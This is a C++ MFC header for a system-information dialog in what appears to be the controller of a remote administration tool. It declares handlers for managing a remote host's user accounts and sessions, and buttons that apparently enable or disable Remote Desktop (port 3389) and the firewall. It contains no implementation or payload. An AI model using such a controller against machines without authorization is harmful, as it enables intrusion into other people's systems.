#pragma once
#include"IOCPServer.h"
#include"../../common/macros.h"
// CSysinfo 对话框

class CSysinfo : public CDialog
{
	DECLARE_DYNAMIC(CSysinfo)

public:
	CSysinfo(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext* pContext = NULL);   // 标准构造函数
	void OnReceiveComplete();
	virtual ~CSysinfo();

	void initView();


	void ShowSelectWindow();

	void ShowSysinfoList();			//显示主机信息列表
	void GetSysinfoList();

	void GetSevList();				//用户列表
	void ShowSevList();

	void GetWtsmList();			//活动列表
	void ShowWtsList();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SYSINFO };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	CListCtrl m_info;					//信息列表框
	CListCtrl m_user;					//用户列表框
	CListCtrl m_status;					//用户状态列表框
	CImageList     m_ImgList;		//图标
	CString m_rport;
	CString m_ruser;
	CString m_rpass;
	CString m_rgroup;

	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;

	MYSYSINFO info;
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();

	CTabCtrl m_system_tab;
	afx_msg void OnTcnSelchangeSystemTab(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnNMRClickListInfo(NMHDR* pNMHDR, LRESULT* pResult);

	afx_msg void OnNMRClickListStatus(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnNMRClickListUser(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnInfoShuaxin();
	afx_msg void OnCopy();
	afx_msg void OnUserShuaxin();
	afx_msg void OnUserStartUp();
	afx_msg void OnUserDisabled();
	afx_msg void OnUserRevise();
	afx_msg void OnUserDel();
	afx_msg void OnUserCopy();
	afx_msg void OnStatusShuaxin();
	afx_msg void OnStatusClose();
	afx_msg void OnStatusOut();
	afx_msg void OnBnClickedButton6();
	afx_msg void OnBnClickedButton2();
	CButton m_fhq;
	afx_msg void OnBnClickedButton1();
	afx_msg void OnBnClickedButton3();
	afx_msg void OnBnClickedButton4();
	afx_msg void OnBnClickedButton5();
	CButton m_open3389;
	CButton m_close3389;
};
